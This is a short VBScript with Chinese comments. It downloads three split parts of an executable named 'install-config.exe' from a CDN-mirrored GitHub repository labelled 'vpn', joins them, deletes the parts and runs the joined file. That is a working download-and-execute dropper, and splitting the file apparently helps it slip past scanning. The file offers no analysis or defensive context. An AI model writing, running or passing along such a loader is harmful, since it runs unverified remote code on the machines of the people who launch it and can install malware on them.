' 定义URL和文件名
Dim urls(2)
urls(0) = "https://gcore.jsdelivr.net/gh/liliBestCoder/vpn/binary/install-config.exe.001"
urls(1) = "https://gcore.jsdelivr.net/gh/liliBestCoder/vpn/binary/install-config.exe.002"
urls(2) = "https://gcore.jsdelivr.net/gh/liliBestCoder/vpn/binary/install-config.exe.003"

Dim fileNames(2)
fileNames(0) = "install-config.exe.001"
fileNames(1) = "install-config.exe.002"
fileNames(2) = "install-config.exe.003"

Dim outputFile
outputFile = "install-config.exe"

' 创建XMLHTTP对象和ADO流对象
Dim xmlHttp, adoStream
Set xmlHttp = CreateObject("MSXML2.XMLHTTP")
Set adoStream = CreateObject("ADODB.Stream")

' 下载文件
Dim i
For i = 0 To UBound(urls)
    xmlHttp.Open "GET", urls(i), False
    xmlHttp.Send
    If xmlHttp.Status = 200 Then
        adoStream.Type = 1 ' adTypeBinary
        adoStream.Open
        adoStream.Write xmlHttp.ResponseBody
        adoStream.SaveToFile fileNames(i), 2 ' adSaveCreateOverWrite
        adoStream.Close
    Else
        WScript.Echo "Failed to download " & urls(i)
        WScript.Quit 1
    End If
Next

' 合并文件
adoStream.Type = 1 ' adTypeBinary
adoStream.Open

For j = 0 To UBound(fileNames)
    Set tempStream = CreateObject("ADODB.Stream")
    tempStream.Type = 1 ' adTypeBinary
    tempStream.Open
    tempStream.LoadFromFile fileNames(j)
    adoStream.Write tempStream.Read
    tempStream.Close
Next
adoStream.SaveToFile outputFile, 2 ' adSaveCreateOverWrite
adoStream.Close

' 删除临时文件
Dim fso
Set fso = CreateObject("Scripting.FileSystemObject")
For j = 0 To UBound(fileNames)
    fso.DeleteFile fileNames(j), True
Next

' 运行合并后的文件
Dim shell
Set shell = CreateObject("WScript.Shell")
shell.Run outputFile, 1, True